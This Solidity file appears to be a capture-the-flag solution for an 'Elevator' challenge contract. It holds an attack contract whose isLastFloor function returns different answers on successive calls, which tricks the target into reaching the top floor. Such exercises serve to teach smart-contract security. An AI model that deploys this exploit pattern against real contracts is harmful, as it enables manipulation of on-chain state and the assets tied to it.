// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Elevator.sol";

contract ElevatorAttack {
    Elevator private immutable target;
    uint private lastFloorCount;

    constructor(address _target) {
        target = Elevator(_target);
    }

    function attack() external {
        target.goTo(1);
        require(target.top(), "Elevator have not reached the top.");
    }

    function isLastFloor(uint floor) external returns (bool) {
        lastFloorCount += floor;
        return lastFloorCount > 1;
    }
}
